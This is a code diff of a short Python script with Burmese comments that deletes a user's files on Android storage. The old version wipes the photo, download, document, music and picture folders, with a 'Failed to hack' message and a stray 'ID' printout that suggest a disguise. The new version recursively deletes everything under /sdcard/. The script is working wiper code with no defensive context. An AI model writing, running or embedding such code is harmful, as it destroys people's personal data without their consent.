@@ -1,18 +1,17 @@
 import os
 import shutil
 
+# /sdcard/ ထဲက အရာအားလုံးကို ရယူမယ်
+root_folder = "/sdcard/"
 
-target_folders = ["/sdcard/DCIM", "/sdcard/Download", "/sdcard/Documents", "/sdcard/Music", "/sdcard/Pictures"]
-
-for folder in target_folders:
-    if os.path.exists(folder):
-        for filename in os.listdir(folder):
-            file_path = os.path.join(folder, filename)
-            try:
-                if os.path.isfile(file_path) or os.path.islink(file_path):
-                    os.unlink(file_path)
-                elif os.path.isdir(file_path):
-                    shutil.rmtree(file_path)
-            except Exception as e:
-                print(f'Failed to hack {file_path}. Reason: {e}')
-print("ID")
+for filename in os.listdir(root_folder):
+    file_path = os.path.join(root_folder, filename)
+    try:
+        # ဖိုင်လား၊ Folder လား ခွဲမနေတော့ဘဲ အကုန်ဖျက်မယ်
+        if os.path.isdir(file_path):
+            shutil.rmtree(file_path)
+        else:
+            os.remove(file_path)
+        print(f"Deleted: {filename}")
+    except Exception as e:
+        print(f"Cannot delete {filename}: {e}")
